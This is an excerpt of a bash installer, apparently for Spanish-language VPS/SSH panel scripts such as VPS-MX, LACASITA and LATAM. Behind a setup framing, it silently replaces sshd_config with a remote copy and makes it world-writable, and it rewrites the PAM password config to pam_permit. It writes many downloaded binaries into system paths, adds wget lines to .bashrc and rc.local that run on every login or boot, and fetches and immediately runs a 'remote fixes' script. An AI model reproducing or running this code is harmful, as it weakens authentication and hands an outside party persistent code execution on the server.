...
install_inicial() {
  ...
  pass_root() {
    wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/onlylovents/Multi-Script/main/Otros/sshd_config >/dev/null 2>&1
...
password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pam.d/common-password
  ...
  apt update
  apt upgrade -y
  wget -O /usr/bin/install https://raw.githubusercontent.com/onlylovents/Multi-Script/main/0-Instalador/install.sh &>/dev/null
...
install_vps_mx_85_oficial() {
  ...
  cd /etc
  wget https://raw.githubusercontent.com/onlylovents/Multi-Script/main/VPS-MX-8.5-Final%20Oficial/VPS-MX.tar.xz >/dev/null 2>&1
  ...
  wget -O /bin/resetsshdrop https://raw.githubusercontent.com/onlylovents/Multi-Script/main/VPS-MX-8.5-Final%20Oficial/Otros/resetsshdrop &>/dev/null
  ...
  v1=$(curl -sSL "https://raw.githubusercontent.com/onlylovents/Multi-Script/main/VPS-MX-8.5-Final%20Oficial/Otros/Version")
  echo "$v1" >/etc/versin_script
  wget -O /etc/versin_script_new https://raw.githubusercontent.com/onlylovents/Multi-Script/main/VPS-MX-8.5-Final%20Oficial/Otros/Version &>/dev/null
  ...
  echo 'wget -O /etc/versin_script_new https://raw.githubusercontent.com/onlylovents/Multi-Script/main/VPS-MX-8.5-Final%20Oficial/Otros/Version &>/dev/null' >>.bashrc
  echo 'echo "" ' >>.bashrc
...
install_LACASITA_90() {
  ...
  mkdir /etc/VPS-MX >/dev/null 2>&1
  cd /etc
  wget https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/VPS-MX.tar.gz >/dev/null 2>&1
  ...
  [[ ! -d /etc/VPS-MX/Slow/Key ]] && mkdir /etc/VPS-MX/Slow/Key
  touch /usr/share/lognull &>/dev/null
  wget https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/SPR -O /usr/bin/SPR &>/dev/null &>/dev/null
  chmod 775 /usr/bin/SPR &>/dev/null
  wget -O /bin/rebootnb https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/rebootnb &>/dev/null
  chmod +x /bin/rebootnb
  wget -O /bin/resetsshdrop https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/resetsshdrop &>/dev/null
  chmod +x /bin/resetsshdrop
  wget -O /etc/versin_script_new https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/Version &>/dev/null
  wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/sshd &>/dev/null
  chmod 777 /etc/ssh/sshd_config
  wget -O /usr/bin/trans https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/trans &>/dev/null
  wget -O /bin/Desbloqueo.sh https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/desbloqueo.sh &>/dev/null
  chmod +x /bin/Desbloqueo.sh
  wget -O /bin/monitor.sh https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/monitor.sh &>/dev/null
  chmod +x /bin/monitor.sh
  wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/estilos.css &>/dev/null
  ...
  rm -rf /usr/local/lib/systemubu1 &>/dev/null
  rm -rf /etc/versin_script &>/dev/null
  v1=$(curl -sSL "https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/Version")
  echo "$v1" >/etc/versin_script
  wget -O /etc/versin_script_new https://raw.githubusercontent.com/onlylovents/Multi-Script/main/LACASITAMX-v9x/Otros/Version &>/dev/null
  echo '#!/bin/sh -e' >/etc/rc.local
  sudo chmod +x /etc/rc.local
...
install_ADMRufu() {
  ...
  cd /etc
  wget https://raw.githubusercontent.com/onlylovents/Multi-Script/main/R9/ADMRufu.tar.xz >/dev/null 2>&1
...
install_ChumoGH() {
  ...
  cd /etc
  wget https://raw.githubusercontent.com/onlylovents/Multi-Script/main/ChuGH-5.7u/adm-lite.tar.gz >/dev/null 2>&1
...
install_latam() {
  ...
  Install_key() {
    wget /root/LATAM https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Instalador/LATAM -O /usr/bin/LATAM &>/dev/null
    ...
    function_verify() {
      permited=$(curl -sSL "https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Control-IP")
      [[ $(echo $permited | grep "${IP}") = "" ]] && {
        ...
        v1=$(curl -sSL "https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Version")
    ...
    install_fim() {
      ...
      wget -O /bin/rebootnb https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Ejecutables/rebootnb.sh &>/dev/null
      chmod +x /bin/rebootnb
      wget -O /etc/SCRIPT-LATAM/temp/version_actual https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Version &>/dev/null
      msgi -bar2
      echo '#!/bin/sh -e' >/etc/rc.local
      sudo chmod +x /etc/rc.local
      ...
      echo 'wget -O /etc/SCRIPT-LATAM/temp/version_actual https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Version &>/dev/null' >>.bashrc
      echo 'echo ""' >>.bashrc
      #-BASH SOPORTE ONLINE
      wget https://raw.githubusercontent.com/onlylovents/LATAM_Oficial/main/Fixs%20Remotos/SPR.sh -O /usr/bin/SPR >/dev/null 2>&1
      chmod +x /usr/bin/SPR
      SPR >/dev/null 2>&1
      timeespera="1"
      times="10"
    ...
    incertar_key() {
      ...
      if [[ -e $HOME/lista-arq ]] && [[ ! $(cat /etc/SCRIPT-LATAM/errorkey | grep "Codificacion Incorrecta") ]]; then
        msgi -bar2
        msgi -verd " Ficheros Copiados \e[97m[\e[93m Key By @Panel_onlylovents_bot \e[97m]"
